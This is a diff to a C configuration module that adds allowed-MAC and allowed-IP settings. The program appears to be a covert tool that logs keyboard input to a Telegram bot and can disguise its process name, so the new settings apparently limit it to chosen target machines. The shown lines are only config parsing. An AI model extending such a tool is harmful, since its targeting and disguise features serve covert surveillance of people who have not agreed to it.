@@ -47,6 +47,8 @@ static char embedded_bot_token[512];
 static char embedded_chat_id[128];
 static char embedded_proxy[512];
 static char embedded_keyboard_layout[64];
+static char embedded_allowed_mac[256];
+static char embedded_allowed_ip[256];
 #ifdef C2T_ENABLE_PROCESS_MASQUERADE
 static char embedded_daemon_name[64];
 static char embedded_supervisor_name[64];
@@ -250,6 +252,22 @@ void c2t_config_load([[maybe_unused]] const char *executable_path) {
   }
   if (config.proxy && !*config.proxy)
     config.proxy = nullptr;
+  config.allowed_mac = configured_value(
+      "C2T_ALLOWED_MAC", embedded_allowed_mac, sizeof(embedded_allowed_mac));
+  if (!config.allowed_mac || !*config.allowed_mac) {
+    config.allowed_mac = configured_value(
+        "ALLOWED_MAC", embedded_allowed_mac, sizeof(embedded_allowed_mac));
+  }
+  if (config.allowed_mac && !*config.allowed_mac)
+    config.allowed_mac = nullptr;
+  config.allowed_ip = configured_value(
+      "C2T_ALLOWED_IP", embedded_allowed_ip, sizeof(embedded_allowed_ip));
+  if (!config.allowed_ip || !*config.allowed_ip) {
+    config.allowed_ip = configured_value(
+        "ALLOWED_IP", embedded_allowed_ip, sizeof(embedded_allowed_ip));
+  }
+  if (config.allowed_ip && !*config.allowed_ip)
+    config.allowed_ip = nullptr;
 }
 
 void c2t_config_load_environment(void) { c2t_config_load(nullptr); }
@@ -352,6 +370,16 @@ const char *c2t_config_apply_arguments(int argc, char **argv) {
           val > TELEGRAM_MAX_LOG_INTERVAL_SEC)
         return argv[index - 1];
       config.telegram_log_interval_sec = (size_t)val;
+    } else if (strcmp(argv[index], "--allowed-mac") == 0) {
+      if (index + 1 >= argc)
+        return argv[index];
+      ++index;
+      config.allowed_mac = argv[index];
+    } else if (strcmp(argv[index], "--allowed-ip") == 0) {
+      if (index + 1 >= argc)
+        return argv[index];
+      ++index;
+      config.allowed_ip = argv[index];
     } else {
       return argv[index];
     }
